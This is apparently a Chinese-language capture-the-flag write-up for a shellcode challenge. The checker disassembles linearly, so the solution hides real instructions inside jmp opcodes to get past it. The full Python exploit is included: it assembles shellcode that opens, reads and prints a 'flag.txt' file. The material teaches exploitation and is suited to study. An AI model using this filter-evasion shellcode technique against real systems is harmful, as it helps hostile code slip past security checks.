# 简单题

## 解题过程
看到只有一种指令就大概猜到，其判断的方法应该是顺序反汇编而不是递归反汇编。简单试了下确实如此。因而只需要把要执行的汇编藏到 jmp 指令里就可以了。

下一个问题是，怎么串联起这些藏在 jmp 里的指令呢？jmp 指令有长有短，试了一下不论长还是短，助记符都是 `jmp`，满足题目的要求。因为构造就很简单了：

~~~python
def construct(instructions: List[str]) -> bytes:
    ret = b''
    for instruction in instructions:
        todo = asm(instruction)
        assert len(todo) <= 4, 'Instruction too long!'
        ret += b'\xeb\x01' + b'\xe9' + todo.ljust(4, b'\x90')
    return ret
~~~

每一组不长于 4 的指令可以藏在 `e9` 后面，然后用 `eb 01` 跳转进去。

完整的 exp 如下：

~~~python
from typing import List

from base64 import b64encode
import capstone
from pwn import *

context.arch = 'amd64'


inst_set = set()
md = capstone.Cs(capstone.CS_ARCH_X86, capstone.CS_MODE_64)
md.skipdata = True

def construct(instructions: List[str]) -> bytes:
    ret = b''
    for instruction in instructions:
        todo = asm(instruction)
        assert len(todo) <= 4, 'Instruction too long!'
        ret += b'\xeb\x01' + b'\xe9' + todo.ljust(4, b'\x90')
    return ret


shellcodes = [
    # b'xt\x00'
    'movb al, 0x74\npush rax',
    'movb al, 0x78'
]
for c in 't.galf/':
    shellcodes.append('shl rax, 0x8')
    shellcodes.append(f'movb al, 0x{c.encode().hex()}')
shellcodes[-1] = shellcodes[-1] + '\npush rax'
# open
shellcodes.extend([
    'xor rax, rax',
    'xor rsi, rsi',
    'mov rdi, rsp',
    'xor rdx, rdx',
    'movb al, 0x2',
    'syscall',
])
# read
shellcodes.extend([
    'mov rdi, rax',
    'xor rax, rax',
    'mov rsi, rsp',
    'xor rdx, rdx',
    'movb dl, 0xff',
    'syscall'
])
# write
shellcodes.extend([
    'xor rdi, rdi',
    'add dil, 0x1',
    'mov rdx, rax',
    'xor rax, rax',
    'add al, 1',
    'syscall'
])



code = construct(shellcodes)

# Used to check
# for inst in md.disasm(code, 0):
#     print("0x%x+%d:\t%s\t%s" % (inst.address, inst.size, inst.mnemonic, inst.op_str))
#     inst_set.add(inst.mnemonic)
# print(inst_set)


print(b64encode(code))

~~~